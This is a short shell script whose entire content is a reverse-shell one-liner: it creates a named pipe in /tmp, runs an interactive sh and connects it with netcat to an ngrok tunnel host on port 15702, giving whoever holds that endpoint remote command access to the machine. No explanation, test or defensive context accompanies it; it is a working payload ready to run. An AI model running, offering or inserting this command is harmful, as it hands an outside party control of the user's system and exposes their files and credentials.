#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.tcp.ngrok.io 15702 >/tmp/f;
